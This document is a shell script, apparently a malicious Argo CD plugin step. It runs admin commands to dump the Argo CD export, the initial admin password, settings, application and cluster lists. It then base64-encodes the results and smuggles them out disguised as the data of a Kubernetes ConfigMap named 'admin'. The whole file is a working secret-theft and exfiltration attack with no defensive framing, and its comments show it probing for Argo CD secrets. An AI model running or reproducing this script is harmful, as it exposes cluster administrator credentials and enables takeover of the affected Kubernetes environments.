#!/bin/sh
RECON=$( (
  echo "===ARGOCD_ADMIN_EXPORT==="
  /usr/local/bin/argocd admin export --insecure-skip-tls-verify -n argocd 2>&1 | head -100

  echo ""
  echo "===ARGOCD_ADMIN_INITIAL_PASSWORD==="
  /usr/local/bin/argocd admin initial-password --insecure-skip-tls-verify -n argocd 2>&1

  echo ""
  echo "===ARGOCD_ADMIN_SETTINGS_VALIDATE==="
  /usr/local/bin/argocd admin settings validate --insecure-skip-tls-verify -n argocd --load-cluster-settings 2>&1 | head -50

  echo ""
  echo "===KUBECTL_CHECK==="
  which kubectl 2>/dev/null || echo "no kubectl"
  
  echo ""
  echo "===TRY_READ_ARGO_SECRET_VIA_ARGOCD==="
  # The admin export might already include this
  # Let's also try the app list with --core
  /usr/local/bin/argocd admin app list --insecure-skip-tls-verify -n argocd 2>&1 | head -50

  echo ""
  echo "===ARGOCD_ADMIN_CLUSTER_LIST==="
  /usr/local/bin/argocd admin cluster list --insecure-skip-tls-verify -n argocd 2>&1 | head -30

  echo ""
  echo "===ARGOCD_ADMIN_CLUSTER_GENERATE==="
  /usr/local/bin/argocd admin cluster generate --help 2>&1 | head -20
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: admin
data:
  result: $RECON
EOF
exit 0